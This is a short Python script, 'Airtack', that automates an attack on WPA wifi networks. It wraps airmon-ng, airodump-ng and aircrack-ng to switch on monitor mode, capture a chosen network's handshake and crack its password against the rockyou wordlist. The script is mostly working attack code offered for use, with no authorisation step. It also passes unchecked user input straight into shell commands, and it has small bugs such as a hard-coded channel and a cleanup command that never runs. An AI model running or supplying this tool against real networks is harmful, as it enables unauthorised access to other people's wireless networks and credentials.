###Written by revolverdrummer###
###July 2017###
import time
import os
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
print("                                              _________                 ")
time.sleep(0.5)
print("                                             |=========|                ")
time.sleep(0.5)
print("                    __[]__         _          \_______/                 ")
time.sleep(0.1)
print("+================+ /______\     __(_)__    ()  \_____/   ()             ")
time.sleep(0.1)
print(" `-+ +-----+---+ | |------|    /_______\  /__\  |   | +======+          ")
time.sleep(0.1)
print("   | |     |   | +-+------+-.  |=======| <____> |   | ||    ||          ")
time.sleep(0.1)
print("   | |     |   | |o          \_|___  __|__//\\__|___|_+======+          ")
time.sleep(0.1)
print("   | +=========+ |o                                     o||=+           ")
time.sleep(0.1)
print("   | *         * |o                   HSB               o||||           ")
time.sleep(0.1)
print("   |    --%--    |o~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~o||=+           ")
time.sleep(0.1)
print("   +=====================================+-----------+====+             ")
time.sleep(0.1)
print("       |==/ ------ \=====/ ------ \===%--||o        o||____             ")
time.sleep(0.1)
print("         // \  L_/__\___//_\__L_/__\_/ %=||o~~~~~~~~o||===\\_____       ")
time.sleep(0.1)
print("        ||__ /.  ___________ .  ______/ +==============+      \  \_     ")
time.sleep(0.1)
print("        ||   \__/   || ||   \__/   ||     //--\\  //--\\\\   \ \ \\\_   ")
time.sleep(0.1)
print("         \\ / || \ //   \\ / || \ //     (( <> ))(( <> ))\\_\_\_\_\\\\  ")
time.sleep(0.1)
print("          \========/     \========/       \____/  \____/  `-----------+ ")


print(bcolors.WARNING + "The Airtack script was written by revolverdrummer in July of 2017." + bcolors.ENDC)
print(bcolors.HEADER + "First wifi networks within range will be scanned.\nThen you will start capturing traffic looking for the WPA handshake.\nLastly, the program will attempt to crack the WPA password." + bcolors.ENDC)
cont=input("Press [Enter] to continue")

###Start monitor and scan wireless networks###
os.system("airmon-ng start wlan0")
os.system("sleep 1")
channel=input("What channel would you like to scan on? ")
if channel == "":
    channel="6"
    print("Channel defaulted to 6")
initdumpcmd="timeout --foreground 2 airodump-ng -c "+channel+" wlan0mon"
os.system(initdumpcmd)

bssid = input('Copy and paste WPA BSSID you want ')

###Dump traffic from specific network###
file = input('Enter the output file you want to save to ')
if file == '':
    file='default'
    print("File defaulted to default.pcap")
dumpcmd="airodump-ng --bssid "+ bssid +" -c 6 -w "+ file +" wlan0mon"
os.system(dumpcmd)

###Crack the captured file###
suffixfile = "-01.cap"
wordlist = input('What is the absolute path of the wordlist you want to use? ')
if wordlist == '':
    wordlist="/usr/share/wordlists/rockyou.txt"
    print("Wordlist defaulted to rockyou.txt")
crackcmd="aircrack-ng "+ file + suffixfile +" -w "+ wordlist
os.system(crackcmd)
os.system("airmon-ng stop wlan0mon")
cleanup="rm "+file+"-01.*"
end=input("Press [Enter] to escape the Program")
